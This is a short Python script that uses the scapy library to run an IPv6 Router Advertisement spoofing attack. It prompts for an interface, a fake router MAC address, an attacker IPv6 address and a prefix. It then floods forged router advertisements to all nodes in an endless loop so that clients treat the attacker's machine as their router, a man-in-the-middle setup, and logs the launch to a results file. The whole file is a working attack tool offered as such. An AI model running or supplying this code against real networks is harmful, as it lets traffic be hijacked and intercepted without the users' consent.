from scapy.all import *
import os

def save_results_to_file(base_name, results):
    results_dir = "results"
    os.makedirs(results_dir, exist_ok=True)

    count = 0
    while True:
        filename = f"{base_name}{count}.txt" if count > 0 else f"{base_name}.txt"
        filepath = os.path.join(results_dir, filename)
        if not os.path.exists(filepath):
            break
        count += 1

    try:
        with open(filepath, 'a') as f:
            for result in results:
                f.write(result + '\n')
        print(f"Results saved in {filepath}")
    except Exception as e:
        print(f"Error writing file: {e}")

def mitm_ipv6_ra():
    print("MITM IPv6 Router Advertisement Tool")
    iface = input("Enter the network interface to use (e.g., eth0): ")
    router_mac = input("Enter the attacker router MAC address (fake): ")
    attacker_ipv6 = input("Enter the attacker IPv6 address: ")
    prefix = input("Enter the IPv6 prefix for the router announcement (e.g., 2001:db8::/64): ")

    # Create the RA packet
    ra_packet = Ether(src=router_mac) / IPv6(src=attacker_ipv6, dst="ff02::1") / ICMPv6ND_RA() / \
                ICMPv6NDOptSrcLLAddr(lladdr=router_mac) / ICMPv6NDOptPrefixInfo(prefixlen=64, prefix=prefix)

    print(f"Sending Router Advertisement packets on interface {iface}...")

    # Continuously send RA packets to fool clients into believing the attacker's machine is the router
    try:
        while True:
            sendp(ra_packet, iface=iface, verbose=False)
    except KeyboardInterrupt:
        print("Attack stopped.")

    result_str = f"MITM IPv6 RA attack launched from {attacker_ipv6} with prefix {prefix}"
    save_results_to_file("mitm_ipv6_ra_results", [result_str])

mitm_ipv6_ra()
